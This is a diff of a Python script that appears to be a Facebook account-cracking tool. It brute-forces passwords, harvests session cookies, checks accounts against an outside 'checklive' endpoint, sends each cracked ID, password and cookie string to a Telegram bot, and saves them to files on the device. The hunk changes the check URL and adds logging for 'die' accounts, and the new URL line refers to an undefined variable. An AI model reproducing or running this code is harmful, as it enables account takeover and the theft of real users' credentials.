@@ -1080,15 +1080,21 @@ def m1(ids,pwv):
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = re.findall('c_user=(.*);xs',coki)[0]
-                ckk = f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
+                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
                 res = requests.get(ckk).text
-                if 'LIVE' in res:
+                if 'live' in res:
                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                         cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {coki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')                        
+                        oks.append(cid)
+                        break
+                if 'die' in res:
+                        print(f'\r\r{rad}[{green}ATOM-DIE{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-DIE-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')                        
                         oks.append(cid)
                         break
             elif 'checkpoint' in log_cookies:
